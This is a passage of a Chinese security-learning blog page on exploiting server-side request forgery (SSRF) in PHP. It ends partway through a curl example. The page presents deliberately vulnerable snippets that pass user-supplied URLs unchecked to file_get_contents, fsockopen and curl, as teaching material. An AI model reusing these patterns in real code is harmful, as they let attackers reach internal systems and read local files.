@@ -1,0 +1,663 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+<head>
+    <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">
+
+    
+      <link rel="icon" href="/favicon.png" />
+    
+
+    <title>
+        
+          Web安全基础学习之SSRF漏洞利用 - ca01h&#39;s Blog
+        
+    </title>
+
+    <!-- Spectre.css framework -->
+    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre.min.css">
+    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre-exp.min.css">
+    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre-icons.min.css">
+
+    <!-- theme css & js -->
+	
+<link rel="stylesheet" href="/css/fontawesome/all.css">
+
+	
+<script src="/js/fontawesome/all.js"></script>
+
+    
+<link rel="stylesheet" href="/css/book.css">
+
+    
+<script src="/js/book.js"></script>
+
+
+    <!-- tocbot -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.min.js"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.css">
+    
+    <!-- katex -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+
+    
+    
+<script src="https://cdnjs.cloudflare.com/ajax/libs/zooming/2.1.1/zooming.min.js"></script>
+<script>
+document.addEventListener('DOMContentLoaded', function () {
+    const zooming = new Zooming()
+    zooming.listen('.book-content img')
+})
+</script>
+
+<meta name="generator" content="Hexo 5.2.0"><link rel="alternate" href="/atom.xml" title="ca01h's Blog" type="application/atom+xml"><!-- hexo-inject:begin --><!-- hexo-inject:end -->
+</head>
+
+<body>
+
+<!-- hexo-inject:begin --><!-- hexo-inject:end --><div class="book-container">
+  <div class="book-sidebar">
+    <div class="book-brand">
+  <a href="/">
+    <img src="/favicon.png">
+    <span>CA01H&#39;S BLOG</span>
+  </a>
+</div>
+    <div class="book-menu">
+  <h1 id="文章归档"><a href="/archives/index.html"><strong>文章归档</strong></a></h1>
+<h1 id="置顶文章"><strong>置顶文章</strong></h1>
+<ul>
+<li><a href="/Other/6.Linux-Enumeration">Linux Enumeration</a></li>
+</ul>
+<h1 id="Web安全"><strong>Web安全</strong></h1>
+<h2 id="Web安全基础">Web安全基础</h2>
+<ul>
+<li><a href="/Web_security/basic_learning/1.%E5%9C%A8Ubuntu18.04%E5%AE%89%E8%A3%85LNMP">在Ubuntu18.04安装LNMP</a></li>
+<li><a href="/Web_security/basic_learning/2.MySQL%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C">MySQL数据库基本操作</a></li>
+<li><a href="/Web_security/basic_learning/3.MySQL%E7%9A%84%E7%B3%BB%E7%BB%9F%E8%A1%A8%E3%80%81%E6%96%87%E4%BB%B6%E8%AF%BB%E5%86%99%E5%92%8CHash%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4">MySQL的系统表、文件读写</a></li>
+<li><a href="/Web_security/basic_learning/4.%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8A%9F%E8%83%BD%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0">数据库系统功能相关学习</a></li>
+<li><a href="/Web_security/basic_learning/5.%E6%95%B0%E6%8D%AE%E5%BA%93%E6%B3%A8%E5%85%A5%E8%AF%AD%E5%8F%A5%E7%9A%84%E6%94%B6%E9%9B%86%E5%92%8C%E5%AD%A6%E4%B9%A0">数据库注入语句的收集和学习</a></li>
+<li><a href="/Web_security/basic_learning/6.Web%E9%A1%B5%E9%9D%A2%E8%A7%A3%E6%9E%90%E7%9A%84%E6%B5%81%E7%A8%8B%E5%AD%A6%E4%B9%A0">Web页面解析的流程学习</a></li>
+<li><a href="/Web_security/basic_learning/7.%E5%90%84%E7%A7%8D%E6%B3%A8%E5%85%A5%E7%B1%BB%E5%9E%8B%E7%9A%84%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E5%92%8C%E4%BB%A3%E7%A0%81%E7%BC%96%E5%86%99">各种注入类型的环境搭建和代码编写</a></li>
+<li><a href="/Web_security/basic_learning/9.Sqli-labs%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94Basic-Challenge">Sqli-labs手工注入(一)</a></li>
+<li><a href="/Web_security/basic_learning/8.Sqli-labs%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94Advanced-Injections">Sqli-labs手工注入(二)</a></li>
+<li><a href="/Web_security/basic_learning/10.SQLMap%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0">SQLMap入门学习</a></li>
+<li><a href="/Web_security/basic_learning/11.SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E5%8F%8C%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5">SQL注入——双查询注入</a></li>
+<li><a href="/Web_security/basic_learning/12.XSS%E6%BC%8F%E6%B4%9E%E5%AE%9E%E6%88%98%E5%AD%A6%E4%B9%A0">XSS漏洞实战学习</a></li>
+<li><a href="/Web_security/basic_learning/13.%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8">文件包含漏洞利用</a></li>
+<li><a href="/Web_security/basic_learning/14.%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8">变量覆盖漏洞利用</a></li>
+<li><a href="/Web_security/basic_learning/16.%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8">文件上传漏洞利用</a></li>
+<li><a href="/Web_security/basic_learning/17.SSRF%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8">SSRF漏洞利用</a></li>
+<li><a href="/Web_security/basic_learning/18.%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8">命令执行漏洞利用</a></li>
+<li><a href="/Web_security/basic_learning/19.%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8">逻辑漏洞利用</a></li>
+<li><a href="/Web_security/basic_learning/20.xxe%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8">XXE漏洞利用</a></li>
+<li><a href="/Web_security/basic_learning/21.NoSQL%E6%B3%A8%E5%85%A5%E4%B9%8BMongoDB">NoSQL注入之MongoDB</a></li>
+<li><a href="/Web_security/basic_learning/22.SQL%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E4%B9%8BMySQL%E5%9F%BA%E7%A1%80%E6%B3%A8%E5%85%A5%E8%AF%AD%E6%B3%95">SQL注入专项之MySQL基本注入语法</a></li>
+<li><a href="/Web_security/basic_learning/24.%E6%B5%85%E8%B0%88LDAP%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB">浅谈LDAP注入攻击</a></li>
+</ul>
+<h2 id="PHP相关">PHP相关</h2>
+<ul>
+<li><a href="/Web_security/php_related/1.PHP%E5%9B%9E%E8%B0%83%E5%90%8E%E9%97%A8">PHP回调后门</a></li>
+<li><a href="/Web_security/php_related/2.PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0-%E5%9F%BA%E7%A1%80%E7%AF%87">PHP反序列化——基础篇</a></li>
+<li><a href="/Web_security/php_related/3.PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0-phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96">PHP反序列化——Phar</a></li>
+<li><a href="/Web_security/php_related/4.PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0-session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96">PHP反序列化——Session</a></li>
+<li><a href="/Web_security/php_related/5.PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0-%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%88%A9%E7%94%A8">PHP反序列化-原生类利用</a></li>
+<li><a href="/Web_security/php_related/8.PHP%E6%97%A0%E6%95%B0%E5%AD%97%E5%AD%97%E6%AF%8D%E6%9E%84%E9%80%A0webshell">PHP无数字字母构造webshell</a></li>
+<li><a href="/Web_security/php_related/9.%E4%BB%8E%E4%B8%80%E9%81%93%E9%A2%98%E5%AD%A6%E4%B9%A0PHP%E6%97%A0%E5%8F%82%E6%95%B0%E5%87%BD%E6%95%B0%E7%9A%84%E5%88%A9%E7%94%A8">PHP无参数函数的利用</a></li>
+<li><a href="/Web_security/php_related/10.%E5%88%A9%E7%94%A8SoapClient%E7%B1%BB%E8%BF%9B%E8%A1%8CSSRF-CRLF%E6%94%BB%E5%87%BB">SoapClient+SSRF+CRLF利用</a></li>
+<li><a href="/Web_security/php_related/12.PHP%E7%9A%84LFI%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93">PHP LFI to RCE</a></li>
+</ul>
+<h2 id="Writeups">Writeups</h2>
+<ul>
+<li><a href="/Web_security/ctf_writeup/3.CGCTF-Writeup">CGCTF-Writeup</a></li>
+<li><a href="/Web_security/ctf_writeup/4.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1">BUUCTF—PHP代审</a></li>
+<li><a href="/Web_security/ctf_writeup/5.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94PHP%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E%E7%AF%87">BUUCTF—PHP框架漏洞</a></li>
+<li><a href="/Web_security/ctf_writeup/6.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96">BUUCTF—PHP反序列化</a></li>
+<li><a href="/Web_security/ctf_writeup/7.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94SQL%E6%B3%A8%E5%85%A5">BUUCTF—SQL注入</a></li>
+<li><a href="/Web_security/ctf_writeup/8.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94XSS">BUUCTF—XSS</a></li>
+<li><a href="/Web_security/ctf_writeup/9.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94SSRF">BUUCTF—SSRF</a></li>
+<li><a href="/Web_security/ctf_writeup/10.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C">BUUCTF—命令执行</a></li>
+<li><a href="/Web_security/ctf_writeup/11.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0">BUUCTF—文件上传</a></li>
+<li><a href="/Web_security/ctf_writeup/12.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB">BUUCTF—文件包含</a></li>
+<li><a href="/Web_security/ctf_writeup/13.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94Python">BUUCTF—Python</a></li>
+<li><a href="/Web_security/ctf_writeup/14.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94NodeJS">BUUCTF—NodeJS</a></li>
+<li><a href="/Web_security/ctf_writeup/15.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94Ruby%E5%8F%8AGo">BUUCTF—Ruby和Go</a></li>
+<li><a href="/Web_security/ctf_writeup/16.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E7%AF%87">BUUCTF—渗透测试</a></li>
+<li><a href="/Web_security/ctf_writeup/17.2020%E7%94%B5%E4%BF%A1%E5%A4%A9%E7%BF%BC%E6%9D%AFCTF%E2%80%94APITest">2020电信天翼杯CTF—APITest</a></li>
+<li><a href="/Web_security/ctf_writeup/18.%E6%98%9F%E7%9B%9F6%E6%9C%88AWD%E5%A4%8D%E7%9B%98%E2%80%94%E2%80%94web+pwn">星盟6月AWD Web+Pwn</a></li>
+<li><a href="/Web_security/ctf_writeup/19.DASCTF2020%E4%B8%83%E6%9C%88%E8%B5%9B">DASCTF2020七月赛 Web</a></li>
+<li><a href="/Web_security/ctf_writeup/20.CSICTF2020">CSICTF2020 Web+Linux</a></li>
+<li><a href="/Web_security/ctf_writeup/21.2020%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4%E6%99%BA%E8%83%BD%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%E7%BA%BF%E4%B8%8A%E8%B5%9BCTF-Web">2020第五空间CTF Web</a></li>
+<li><a href="/Web_security/ctf_writeup/22.%E9%A6%96%E5%B1%8A%E9%92%93%E9%B1%BC%E5%9F%8E%E6%9D%AFCTF">首届钓鱼城杯CTF</a></li>
+<li><a href="/Web_security/ctf_writeup/23.DASCTF2020%E5%85%AB%E6%9C%88%E8%B5%9B">DASCTF八月赛</a></li>
+</ul>
+<h1 id="靶机系列"><strong>靶机系列</strong></h1>
+<h2 id="HackTheBox">HackTheBox</h2>
+<ul>
+<li><a href="/Target_drone/HackTheBox/1.HTB-OpenAdmin-walkthrough">HTB::OpenAdmin</a></li>
+<li><a href="/Target_drone/HackTheBox/2.HTB-Postman-walkthrough">HTB::Postman</a></li>
+<li><a href="/Target_drone/HackTheBox/3.HTB-Traverxec-walkthrough">HTB::Traverxec</a></li>
+<li><a href="/Target_drone/HackTheBox/4.HTB-Obscurity-walkthrough">HTB::Obscurity</a></li>
+<li><a href="/Target_drone/HackTheBox/5.HTB-Mongo-walkthrough">HTB::Mongo</a></li>
+<li><a href="/Target_drone/HackTheBox/6.HTB-Tenten-walkthrough">HTB::Tenten</a></li>
+<li><a href="/Target_drone/HackTheBox/7.HTB-Sneaky-walkthrough">HTB::Sneaky</a></li>
+<li><a href="/Target_drone/HackTheBox/8.HTB-Teacher-walkthrough">HTB::Teacher</a></li>
+<li><a href="/Target_drone/HackTheBox/9.HTB-Irked-walkthrough">HTB::Irked</a></li>
+<li><a href="/Target_drone/HackTheBox/10.HTB-Traceback-walkthrough">HTB::Traceback</a></li>
+<li><a href="/Target_drone/HackTheBox/11.HTB-DevOops-walkthrough">HTB::DevOops</a></li>
+<li><a href="/Target_drone/HackTheBox/12.HTB-Blocky-walkthrough">HTB::Blocky</a></li>
+<li><a href="/Target_drone/HackTheBox/13.HTB-Beep-walkthrough">HTB::Beep</a></li>
+<li><a href="/Target_drone/HackTheBox/14.HTB-Book-walkthrough">HTB::Book</a></li>
+<li><a href="/Target_drone/HackTheBox/16.HTB-Craft-walkthrough">HTB::Craft</a></li>
+<li><a href="/Target_drone/HackTheBox/17.HTB-CTF-walkthrough">HTB::CTF</a></li>
+<li><a href="/Target_drone/HackTheBox/15.HTB-Magic-walkthrough">HTB::Magic</a></li>
+</ul>
+<h2 id="VulnHub">VulnHub</h2>
+<ul>
+<li><a href="/Target_drone/VulnHub/1.VulnHub-BossplayersCTF-walkthrough">VulnHub::BossplayersCTF</a></li>
+<li><a href="/Target_drone/VulnHub/2.VulnHub-DC-1-walkthrough">VulnHub::DC-1</a></li>
+<li><a href="/Target_drone/VulnHub/3.VulnHub-DigitalWorld-Local-JOY-walkthrough">VulnHub::DigitalWorld:JOY</a></li>
+</ul>
+<h1 id="代码审计"><strong>代码审计</strong></h1>
+<h2 id="PHP代码审计">PHP代码审计</h2>
+<ul>
+<li><a href="/code_audit/3.PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%E2%80%94%E2%80%94Day1">PHP代码审计学习—Day1</a></li>
+<li><a href="/code_audit/4.PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%E2%80%94%E2%80%94Day2">PHP代码审计学习—Day2</a></li>
+<li><a href="/code_audit/5.PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%E2%80%94%E2%80%94Day3">PHP代码审计学习—Day3</a></li>
+<li><a href="/code_audit/6.PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%E2%80%94%E2%80%94Day4">PHP代码审计学习—Day4</a></li>
+<li><a href="/code_audit/7.PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%E2%80%94%E2%80%94Day5">PHP代码审计学习—Day5</a></li>
+<li><a href="/code_audit/1.PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%A4%8D%E7%8E%B0%E2%80%94%E2%80%94yixuncms">PHP代码审计复现—yixuncms</a></li>
+<li><a href="/code_audit/2.PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%A4%8D%E7%8E%B0%E2%80%94%E2%80%94chinaz">PHP代码审计复现—chinaz</a></li>
+</ul>
+<h1 id="流量分析"><strong>流量分析</strong></h1>
+<ul>
+<li><a href="/Web_security/traffic_analysis/1.Datacon2019-q1-Writeup-v1">Datacon2019-q1-wp-v1</a></li>
+<li><a href="/Web_security/traffic_analysis/2.Datacon2019-q1-Writeup-v2">Datacon2019-q1-wp-v2</a></li>
+<li><a href="/Web_security/traffic_analysis/3.Bro%E8%AF%AD%E6%B3%95%E5%AD%A6%E4%B9%A0%E4%B9%8B%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86">Bro语法学习之基础知识</a></li>
+</ul>
+<h1 id="机器学习"><strong>机器学习</strong></h1>
+<h2 id="基础学习">基础学习</h2>
+<ul>
+<li><a href="/Machine_learning/basic_learning/1.Machine-Learning-Week1">Machine-Learning-Week1</a></li>
+<li><a href="/Machine_learning/basic_learning/2.Machine-Learning-Week2">Machine-Learning-Week2</a></li>
+<li><a href="/Machine_learning/basic_learning/3.Machine-Learning-Week3">Machine-Learning-Week3</a></li>
+<li><a href="/Machine_learning/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E4%B8%8E%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%9B%B8%E5%85%B3%E7%9A%84%E8%B5%84%E6%96%99%EF%BC%88%E8%BD%AC%EF%BC%89">机器学习与网络安全相关的资料（转）</a></li>
+</ul>
+<h1 id="Python"><strong>Python</strong></h1>
+<h2 id="Python编程">Python编程</h2>
+<ul>
+<li>
+<p><a href="/Python/code/1.Python%E5%87%BD%E6%95%B0%E7%9A%84%E5%8F%82%E6%95%B0">Python函数的参数</a></p>
+</li>
+<li>
+<p><a href="/Python/code/2.Python%E5%87%BD%E6%95%B0%E5%BC%8F%E7%BC%96%E7%A8%8B%E4%B9%8B%E9%AB%98%E9%98%B6%E5%87%BD%E6%95%B0">Python函数式编程之高阶函数</a></p>
+</li>
+<li>
+<p><a href="/Python/code/3.Python%E5%87%BD%E6%95%B0%E5%BC%8F%E7%BC%96%E7%A8%8B-%E9%97%AD%E5%8C%85">Python函数式编程-闭包</a></p>
+</li>
+<li>
+<p><a href="/Python/code/4.Python%E5%87%BD%E6%95%B0%E5%BC%8F%E7%BC%96%E7%A8%8B-%E8%A3%85%E9%A5%B0%E5%99%A8">Python函数式编程-装饰器</a></p>
+</li>
+<li>
+<p><a href="/Python/code/5.Python%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E9%AB%98%E7%BA%A7%E7%BC%96%E7%A8%8B%E4%B9%8Bslots%E3%80%81@property%E5%92%8C%E5%A4%9A%E9%87%8D%E7%BB%A7%E6%89%BF">Python面向对象高级编程之slots、@property和多重继承</a></p>
+</li>
+<li>
+<p><a href="/Python/code/6.PythonIO%E7%BC%96%E7%A8%8B">PythonIO编程</a></p>
+</li>
+</ul>
+<h1 id="Java"><strong>Java</strong></h1>
+<h2 id="Java编程">Java编程</h2>
+<ul>
+<li><a href="/Java/code/1.Java%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E4%B9%8BJDK%E3%80%81JRE%E3%80%81JVM">Java基础学习之JDK、JRE、JVM</a></li>
+<li><a href="/Java/code/2.Java%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%A0%B8%E5%BF%83%E7%B1%BB">Java基础学习之核心类</a></li>
+<li><a href="/Java/code/3.Java%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E4%B9%8B%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E5%9F%BA%E7%A1%80">Java基础学习之面向对象基础</a></li>
+<li><a href="/Java/code/4.Java%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E4%B9%8B%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86">Java基础学习之异常处理</a></li>
+</ul>
+<h1 id="算法"><strong>算法</strong></h1>
+<h2 id="Leetcode">Leetcode</h2>
+<ul>
+<li><a href="/Algorithm/1.Leetcode-Primary-class">Leetcode-Primary-class</a></li>
+</ul>
+<h1 id="随笔"><strong>随笔</strong></h1>
+<h2 id="经验">经验</h2>
+<ul>
+<li><a href="/Essay/%E4%BB%8E0%E5%88%B0100%E5%88%86%E7%9A%84%E8%B7%AF%E7%A8%8B%E2%80%94%E2%80%94%E5%86%99%E5%9C%A82019%E5%B9%B4%E7%9A%84%E6%9C%80%E5%90%8E%E4%B8%80%E5%A4%A9">从0到100分的路程——写在2019年的最后一天</a></li>
+</ul>
+<h2 id="技术">技术</h2>
+<ul>
+<li><a href="/Other/1.%E9%98%BF%E9%87%8C%E4%BA%91Centos7-Ngnix%E9%83%A8%E7%BD%B2Hexo">阿里云Centos7-Ngnix部署Hexo</a></li>
+<li><a href="/Other/2.%E9%98%BF%E9%87%8C%E4%BA%91OSS-PicGo%E6%90%AD%E5%BB%BAMarkdown%E5%9B%BE%E5%BA%8A">阿里云OSS-PicGo搭建Markdown图床</a></li>
+<li><a href="/Other/3.Hexo%E6%B8%B2%E6%9F%93LaTeX%E6%95%B0%E5%AD%A6%E5%85%AC%E5%BC%8F">Hexo渲染LaTeX数学公式</a></li>
+<li><a href="/Other/4.git%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E6%80%9D%E7%BB%B4%E5%AF%BC%E5%9B%BE">Git CheatSheet</a></li>
+<li><a href="/Other/5.Tmux%E5%BF%AB%E6%8D%B7%E9%94%AE%E5%A4%87%E5%BF%98%E5%BD%95">Tmux CheatSheet</a></li>
+</ul>
+
+</div>
+
+
+<script src="/js/book-menu.js"></script>
+
+  </div>
+
+  <div class="sidebar-toggle" onclick="sidebar_toggle()" onmouseover="add_inner()" onmouseleave="remove_inner()">
+  <div class="sidebar-toggle-inner"></div>
+</div>
+
+<script>
+function add_inner() {
+  let inner = document.querySelector('.sidebar-toggle-inner')
+  inner.classList.add('show')  
+}
+
+function remove_inner() {
+  let inner = document.querySelector('.sidebar-toggle-inner')
+  inner.classList.remove('show')
+}
+
+function sidebar_toggle() {
+    let sidebar_toggle = document.querySelector('.sidebar-toggle')
+    let sidebar = document.querySelector('.book-sidebar')
+    let content = document.querySelector('.off-canvas-content')
+    if (sidebar_toggle.classList.contains('extend')) { // show
+        sidebar_toggle.classList.remove('extend')
+        sidebar.classList.remove('hide')
+        content.classList.remove('extend')
+    }
+    else { // hide
+        sidebar_toggle.classList.add('extend')
+        sidebar.classList.add('hide')
+        content.classList.add('extend')
+    }
+}
+</script>
+
+  <div class="off-canvas-content">
+    <div class="columns">
+      <div class="column col-10 col-lg-12">
+        <div class="book-navbar">
+          <!-- For Responsive Layout -->
+
+<header class="navbar">
+  <section class="navbar-section">
+    <a onclick="open_sidebar()">
+      <i class="icon icon-menu"></i>
+    </a>
+  </section>
+</header>
+
+        </div>
+        <div class="book-content">
+          <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<div class="book-post">
+  
+  <i class="fas fa-calendar-day"></i>&nbsp;2019-12-17&nbsp;
+  <i class="fas fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span><span> times</span>&nbsp;
+  <i class="fas fa-file-word"></i>&nbsp;<span class="post-count">7.6k</span>
+  
+  <h1 id="Web安全基础学习之SSRF漏洞利用">Web安全基础学习之SSRF漏洞利用</h1>
+<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191206123722.png" alt=""></p>
+<h2 id="什么是ssrf">什么是ssrf</h2>
+<p>SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。（正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统）。</p>
+<p>简单来讲就是，服务器会响应用户的url请求，但是没有做好过滤和限制，导致可以攻击内网。</p>
+<h2 id="漏洞产生">漏洞产生</h2>
+<p>由于服务端提供了从其他服务器应用获取数据的功能且没有对用户可控的目标地址做过虑与限制。</p>
+<p>在PHP中的curl()，file_get_contents()，fsockopen()等函数是几个主要产生ssrf漏洞的函数。</p>
+<h3 id="file-get-contents">file_get_contents()</h3>
+<p>file_get_contents是把文件写入字符串，当把url是内网文件的时候，他会先去把这个文件的内容读出来再写入，导致了文件读取。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;url&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    $content=file_get_contents($_POST[<span class="string">&#x27;url&#x27;</span>]);</span><br><span class="line">    $filename=<span class="string">&#x27;./images/&#x27;</span>.rand().<span class="string">&#x27;.img&#x27;</span>;\</span><br><span class="line">    file_put_contents($filename,$content);</span><br><span class="line">    <span class="keyword">echo</span> $_POST[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line">    $img=<span class="string">&quot;&lt;img src=\&quot;&quot;</span>.$filename.<span class="string">&quot;\&quot;/&gt;&quot;</span>;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> $img;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<h3 id="fsockopen">fsockopen()</h3>
+<p><code>fsockopen()</code>函数本身就是打开一个网络连接或者Unix套接字连接。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$host=$_GET[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line">$fp = fsockopen(<span class="string">&quot;<span class="subst">$host</span>&quot;</span>, <span class="number">80</span>, $errno, $errstr, <span class="number">30</span>);</span><br><span class="line"><span class="keyword">if</span> (!$fp) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$errstr</span> (<span class="subst">$errno</span>)&lt;br /&gt;\n&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $out = <span class="string">&quot;GET / HTTP/1.1\r\n&quot;</span>;</span><br><span class="line">    $out .= <span class="string">&quot;Host: <span class="subst">$host</span>\r\n&quot;</span>;</span><br><span class="line">    $out .= <span class="string">&quot;Connection: Close\r\n\r\n&quot;</span>;</span><br><span class="line">    fwrite($fp, $out);</span><br><span class="line">    <span class="keyword">while</span> (!feof($fp)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> fgets($fp, <span class="number">128</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    fclose($fp);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<h3 id="curl">curl()</h3>
+<p>这应该是大家最熟悉的一个函数了，因为利用方式很多最常见的是通过file、dict、gopher这三个协议来进行渗透，接下来也主要是集中讲对于<code>curl()</code>函数的利用方式。</p>
+<blockquote>
+<p>这里一定要安装PHP的curl扩展！！！Windows环境下php-study用多了，到了Linux环境都不知道怎么搭环境了。（折腾了一下午发现没有安装php-curl…==）<a target="_blank" rel="noopener" href="https://segmentfault.com/a/1190000009068818">https://segmentfault.com/a/1190000009068818</a></p>
+</blockquote>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">curl</span>(<span class="params">$url</span>)</span>&#123;  </span><br><span class="line">    $ch = curl_init();</span><br><span class="line">    curl_setopt($ch, CURLOPT_URL, $url);</span><br><span class="line">    curl_setopt($ch, 